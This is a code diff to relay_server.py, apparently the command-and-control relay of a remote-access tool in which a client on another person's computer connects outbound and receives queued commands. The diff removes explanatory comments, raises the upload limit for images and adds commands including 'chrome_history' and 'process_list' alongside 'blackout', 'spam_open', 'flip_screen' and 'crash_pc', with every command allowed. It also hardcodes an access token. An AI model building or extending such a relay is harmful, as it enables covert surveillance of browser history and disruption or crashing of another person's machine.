@@ -1,13 +1,8 @@
 """
 relay_server.py - Relay that runs on YOUR PC
 
-PC.pyw on the other computer connects OUTBOUND to this relay.
-MENU.pyw on your computer connects to this relay locally.
-
-Run on YOUR PC:
-    py relay_server.py
-
-This version allows EVERY command. No locks, no blocked commands.
+This version allows EVERY command. No locks.
+Root URL serves an HTML alive-page so UptimeRobot keeps it awake.
 """
 
 from __future__ import annotations
@@ -24,10 +19,8 @@ from typing import Any
 HOST = "0.0.0.0"
 PORT = int(os.environ.get("PORT", "9000"))
 
-# Same token must be in relay_server.py, MENU.pyw, and PC.pyw.
 RELAY_TOKEN = "thefirstaccievercreated164thefirstaccievercreated165thefirstaccievercreated166"
 
-# Any command is allowed. This dict is kept for compatibility.
 SAFE_COMMAND_FLAGS: dict[str, bool] = {
     "status": True,
     "log": True,
@@ -50,18 +43,19 @@ SAFE_COMMAND_FLAGS: dict[str, bool] = {
     "blackout": True,
     "spam_open": True,
     "flip_screen": True,
+    "process_list": True,
+    "chrome_history": True,
+    "close_tab": True,
+    "show_image": True,
+    "speak": True,
     "crash": True,
     "crash_pc": True,
 }
 
-# Nothing is ever blocked.
 BLOCKED_COMMANDS: dict[str, str] = {}
 
-# device_id -> info
 DEVICES: dict[str, dict[str, Any]] = {}
-# device_id -> list of queued command dicts
 QUEUES: dict[str, list[dict[str, Any]]] = {}
-# command_id -> result dict
 RESULTS: dict[str, dict[str, Any]] = {}
 LOCK = threading.Lock()
 
@@ -94,9 +88,6 @@ def clean_old_results() -> None:
 
 
 def command_allowed(action: str) -> tuple[bool, str]:
-    """
-    No locks. Every non-empty command is allowed.
-    """
     if not action:
         return False, "Missing action"
     return True, "Allowed"
@@ -128,7 +119,7 @@ class RelayHandler(BaseHTTPRequestHandler):
         length = int(self.headers.get("Content-Length", "0") or "0")
         if length <= 0:
             return {}
-        raw = self.rfile.read(min(length, 100_000))
+        raw = self.rfile.read(min(length, 50_000_000))  # 50MB max for images
         try:
             return json.loads(raw.decode("utf-8"))
         except Exception:
@@ -168,9 +159,6 @@ class RelayHandler(BaseHTTPRequestHandler):
 
         path = self.path.rstrip("/")
 
-        # --------------------------
-        # PC.pyw endpoints
-        # --------------------------
         if path == "/pc/hello":
             device_id = str(data.get("device_id", "")).strip()
             if not device_id:
@@ -232,9 +220,6 @@ class RelayHandler(BaseHTTPRequestHandler):
             self.send_json(200, {"ok": True})
             return
 
-        # --------------------------
-        # MENU.pyw endpoints
-        # --------------------------
         if path == "/menu/devices":
             with LOCK:
                 devices = list(DEVICES.values())
